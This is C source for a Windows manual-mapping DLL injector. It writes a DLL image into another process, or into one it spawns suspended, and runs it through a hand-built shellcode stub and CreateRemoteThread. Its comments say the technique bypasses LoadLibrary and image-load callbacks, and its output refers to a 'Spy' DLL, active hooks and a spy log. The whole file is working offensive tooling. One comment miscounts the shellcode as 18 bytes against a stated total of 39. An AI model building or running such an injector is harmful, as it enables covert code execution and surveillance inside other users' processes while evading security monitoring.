// NexusInject_mm.exe -- Manual-mapping DLL injector (bypasses LoadLibrary).
// Usage: NexusInject_mm.exe <PID> <DllPath>
//
// Steps:
//   1. Read DLL file into local buffer.
//   2. OpenProcess(VM_OPERATION|VM_WRITE|VM_READ|CREATE_THREAD|QUERY_INFORMATION).
//   3. VirtualAllocEx(SizeOfImage, PAGE_EXECUTE_READWRITE) in target.
//   4. Local: build a flat image (header + sections at VA offsets) within our buf.
//   5. Apply base relocations (delta = remoteBase - imageBase).
//   6. Resolve IAT — read each imported DLL/function name, GetModuleHandle/GetProcAddress
//      LOCALLY (assumes target has the same DLLs at same VAs — true for kernel32/ntdll/
//      user32/ucrtbase since ASLR-per-boot).
//   7. WriteProcessMemory the prepared image into the remote allocation.
//   8. CreateRemoteThread targeting AddressOfEntryPoint with our remoteBase as arg
//      (DllMain takes 3 args but we just call AddressOfEntryPoint with hModule=remoteBase
//      and reason=DLL_PROCESS_ATTACH; the entry will read those from rdi/rdx anyway via
//      a tiny shellcode launcher).
//
// This bypasses LoadLibrary and any image-load callbacks because the DLL is never
// loaded by the OS loader.

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// 18-byte shellcode that calls DllMain with proper args:
//   mov rcx, <hMod>      ; 48 b9 ?? ?? ?? ?? ?? ?? ?? ??   (10)
//   mov edx, 1           ; ba 01 00 00 00                  (5)
//   xor r8d, r8d         ; 45 33 c0                        (3)
//   sub rsp, 0x28        ; 48 83 ec 28                     (4)
//   mov rax, <entry>     ; 48 b8 ?? ?? ?? ?? ?? ?? ?? ??   (10)
//   call rax             ; ff d0                           (2)
//   add rsp, 0x28        ; 48 83 c4 28                     (4)
//   ret                  ; c3                              (1)
// Total: 39 bytes.
static const unsigned char SC_TEMPLATE[] = {
    0x48, 0xB9, 0,0,0,0,0,0,0,0,        // mov rcx, hMod  (offset 2)
    0xBA, 0x01, 0x00, 0x00, 0x00,       // mov edx, 1
    0x45, 0x33, 0xC0,                    // xor r8d, r8d
    0x48, 0x83, 0xEC, 0x28,              // sub rsp, 0x28
    0x48, 0xB8, 0,0,0,0,0,0,0,0,        // mov rax, entry (offset 24)
    0xFF, 0xD0,                          // call rax
    0x48, 0x83, 0xC4, 0x28,              // add rsp, 0x28
    0xC3,                                // ret
};

#define SC_LEN 39
#define SC_OFF_HMOD  2
#define SC_OFF_ENTRY 24

static void* ReadFileFully(const wchar_t* path, DWORD* outSize) {
    HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return NULL;
    DWORD sz = GetFileSize(h, NULL);
    void* buf = malloc(sz);
    DWORD got = 0;
    ReadFile(h, buf, sz, &got, NULL);
    CloseHandle(h);
    *outSize = got;
    return buf;
}

int wmain(int argc, wchar_t** argv) {
    if (argc < 3) {
        wprintf(L"Usage:\n");
        wprintf(L"  NexusInject_mm.exe <PID> <DllPath>                  (inject into existing PID)\n");
        wprintf(L"  NexusInject_mm.exe --spawn <ExePath> <DllPath>      (spawn ExePath suspended, inject, resume)\n");
        return 1;
    }

    DWORD pid = 0;
    const wchar_t* dllPath = NULL;
    HANDLE hSpawnProc = NULL;
    HANDLE hSpawnThread = NULL;

    if (wcscmp(argv[1], L"--spawn") == 0) {
        if (argc < 4) {
            wprintf(L"--spawn needs <ExePath> <DllPath>\n");
            return 1;
        }
        const wchar_t* exePath = argv[2];
        dllPath = argv[3];
        wprintf(L"[+] Spawning %s SUSPENDED...\n", exePath);
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = {};
        // Use a mutable cmdline buffer
        wchar_t cmdline[512];
        wcscpy_s(cmdline, 512, L"\"");
        wcscat_s(cmdline, 512, exePath);
        wcscat_s(cmdline, 512, L"\"");
        if (!CreateProcessW(exePath, cmdline, NULL, NULL, FALSE,
                CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
            wprintf(L"[-] CreateProcessW failed: %lu\n", GetLastError());
            return 2;
        }
        wprintf(L"[+] Spawned PID=%lu TID=%lu (suspended)\n", pi.dwProcessId, pi.dwThreadId);
        pid = pi.dwProcessId;
        hSpawnProc = pi.hProcess;
        hSpawnThread = pi.hThread;
    } else {
        pid = _wtoi(argv[1]);
        dllPath = argv[2];
    }

    DWORD fileSize;
    BYTE* fileBuf = (BYTE*)ReadFileFully(dllPath, &fileSize);
    if (!fileBuf) { wprintf(L"[-] open DLL failed: %lu\n", GetLastError()); return 2; }
    wprintf(L"[+] DLL file: %u bytes\n", fileSize);

    // Parse PE
    if (*(WORD*)fileBuf != 'ZM') { wprintf(L"[-] no MZ\n"); return 3; }
    DWORD e_lfanew = *(DWORD*)(fileBuf + 0x3C);
    if (*(DWORD*)(fileBuf + e_lfanew) != 0x4550) { wprintf(L"[-] no PE\n"); return 3; }
    IMAGE_NT_HEADERS64* nth = (IMAGE_NT_HEADERS64*)(fileBuf + e_lfanew);
    DWORD sizeOfImage = nth->OptionalHeader.SizeOfImage;
    DWORD sizeOfHeaders = nth->OptionalHeader.SizeOfHeaders;
    ULONGLONG imageBase = nth->OptionalHeader.ImageBase;
    DWORD entryRva = nth->OptionalHeader.AddressOfEntryPoint;
    WORD nSec = nth->FileHeader.NumberOfSections;
    wprintf(L"[+] PE: ImageBase=0x%llX  SizeOfImage=0x%lX  EntryRVA=0x%lX  Sections=%u\n",
        imageBase, sizeOfImage, entryRva, nSec);

    // Build VA-aligned local image
    BYTE* localImg = (BYTE*)VirtualAlloc(NULL, sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!localImg) { wprintf(L"[-] local alloc failed\n"); return 4; }
    memset(localImg, 0, sizeOfImage);
    memcpy(localImg, fileBuf, sizeOfHeaders);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nth);
    for (WORD i = 0; i < nSec; i++) {
        if (sec[i].SizeOfRawData) {
            memcpy(localImg + sec[i].VirtualAddress,
                   fileBuf + sec[i].PointerToRawData,
                   sec[i].SizeOfRawData);
        }
    }

    // Open target + allocate RWX (use spawn handle if --spawn)
    HANDLE hProc;
    if (hSpawnProc) {
        hProc = hSpawnProc;
        wprintf(L"[+] Using spawn handle\n");
    } else {
        hProc = OpenProcess(
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ |
            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, FALSE, pid);
        if (!hProc) { wprintf(L"[-] OpenProcess failed: %lu\n", GetLastError()); return 5; }
    }
    BYTE* remoteBase = (BYTE*)VirtualAllocEx(hProc, NULL, sizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBase) {
        DWORD err = GetLastError();
        wprintf(L"[-] VirtualAllocEx(EXEC) failed: %lu (0x%lX)\n", err, err);
        // Try fallback: PAGE_READWRITE then VirtualProtectEx
        remoteBase = (BYTE*)VirtualAllocEx(hProc, NULL, sizeOfImage,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remoteBase) {
            wprintf(L"[-] VirtualAllocEx(RW) also failed: %lu\n", GetLastError());
            return 6;
        }
        wprintf(L"[!] Got RW; will need VirtualProtectEx\n");
    }
    wprintf(L"[+] Remote alloc at %p\n", remoteBase);

    // Apply base relocations: delta = remoteBase - imageBase
    LONGLONG delta = (LONGLONG)remoteBase - (LONGLONG)imageBase;
    wprintf(L"[+] Reloc delta: 0x%llX\n", delta);
    if (delta != 0) {
        IMAGE_DATA_DIRECTORY relocDir = nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.Size) {
            BYTE* p = localImg + relocDir.VirtualAddress;
            BYTE* pEnd = p + relocDir.Size;
            while (p < pEnd) {
                IMAGE_BASE_RELOCATION* rb = (IMAGE_BASE_RELOCATION*)p;
                if (rb->SizeOfBlock == 0) break;
                int n = (rb->SizeOfBlock - sizeof(*rb)) / 2;
                WORD* entries = (WORD*)(rb + 1);
                for (int i = 0; i < n; i++) {
                    int type = entries[i] >> 12;
                    int off = entries[i] & 0xFFF;
                    if (type == IMAGE_REL_BASED_DIR64) {
                        ULONGLONG* addr = (ULONGLONG*)(localImg + rb->VirtualAddress + off);
                        *addr += delta;
                    }
                }
                p += rb->SizeOfBlock;
            }
            wprintf(L"[+] Relocations applied\n");
        }
    }

    // Resolve IAT — assume target shares ASLR base for system DLLs
    IMAGE_DATA_DIRECTORY impDir = nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (impDir.Size) {
        IMAGE_IMPORT_DESCRIPTOR* imp = (IMAGE_IMPORT_DESCRIPTOR*)(localImg + impDir.VirtualAddress);
        for (; imp->Name; imp++) {
            const char* dllName = (const char*)(localImg + imp->Name);
            HMODULE hMod = LoadLibraryA(dllName);
            if (!hMod) {
                wprintf(L"[-] couldn't local-load %hs\n", dllName);
                return 7;
            }
            ULONGLONG* oft = (ULONGLONG*)(localImg + (imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk));
            ULONGLONG* ft  = (ULONGLONG*)(localImg + imp->FirstThunk);
            for (; *oft; oft++, ft++) {
                FARPROC fn;
                if (*oft & IMAGE_ORDINAL_FLAG64) {
                    fn = GetProcAddress(hMod, (LPCSTR)(*oft & 0xFFFF));
                } else {
                    IMAGE_IMPORT_BY_NAME* ibn = (IMAGE_IMPORT_BY_NAME*)(localImg + *oft);
                    fn = GetProcAddress(hMod, ibn->Name);
                }
                if (!fn) {
                    wprintf(L"[-] missing import in %hs\n", dllName);
                    return 8;
                }
                *ft = (ULONGLONG)fn;
            }
        }
        wprintf(L"[+] IAT resolved\n");
    }

    // Write the prepared image to the remote allocation
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, remoteBase, localImg, sizeOfImage, &written) || written != sizeOfImage) {
        wprintf(L"[-] WriteProcessMemory failed: %lu (wrote=%zu)\n", GetLastError(), written);
        return 9;
    }
    wprintf(L"[+] Image written (%zu bytes)\n", written);

    // Build shellcode that calls DllMain(hMod=remoteBase, reason=DLL_PROCESS_ATTACH, NULL)
    BYTE sc[SC_LEN];
    memcpy(sc, SC_TEMPLATE, SC_LEN);
    *(ULONGLONG*)(sc + SC_OFF_HMOD)  = (ULONGLONG)remoteBase;
    *(ULONGLONG*)(sc + SC_OFF_ENTRY) = (ULONGLONG)remoteBase + entryRva;

    // Allocate shellcode in target
    BYTE* remoteSc = (BYTE*)VirtualAllocEx(hProc, NULL, 0x100,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteSc) { wprintf(L"[-] sc alloc failed\n"); return 10; }
    if (!WriteProcessMemory(hProc, remoteSc, sc, SC_LEN, &written)) {
        wprintf(L"[-] sc WPM failed\n"); return 11;
    }
    wprintf(L"[+] Shellcode at %p (entry stub for DllMain)\n", remoteSc);

    // Launch
    DWORD tid = 0;
    HANDLE hT = CreateRemoteThread(hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteSc, NULL, 0, &tid);
    if (!hT) { wprintf(L"[-] CreateRemoteThread failed: %lu\n", GetLastError()); return 12; }
    wprintf(L"[+] Spy thread TID=%lu launched\n", tid);

    DWORD wait = WaitForSingleObject(hT, 5000);
    DWORD exitCode = 0;
    GetExitCodeThread(hT, &exitCode);
    if (wait == WAIT_OBJECT_0) {
        wprintf(L"[+] Spy DllMain return = 0x%lX\n", exitCode);
    } else {
        wprintf(L"[!] Spy DllMain timeout; thread state may still be running\n");
    }
    CloseHandle(hT);

    // If we spawned suspended, resume the main thread NOW (after spy DllMain returned)
    if (hSpawnThread) {
        wprintf(L"[+] Sleeping 200ms to let hooks settle, then ResumeThread...\n");
        Sleep(200);
        DWORD prevCount = ResumeThread(hSpawnThread);
        wprintf(L"[+] ResumeThread prevCount=%lu (target now running with hooks active)\n", prevCount);
        CloseHandle(hSpawnThread);
    }

    if (!hSpawnProc) CloseHandle(hProc);
    else CloseHandle(hSpawnProc);
    VirtualFree(localImg, 0, MEM_RELEASE);
    free(fileBuf);
    wprintf(L"[+] Done. Tail C:\\ProgramData\\NexusSpy_%lu.log\n", pid);
    return 0;
}
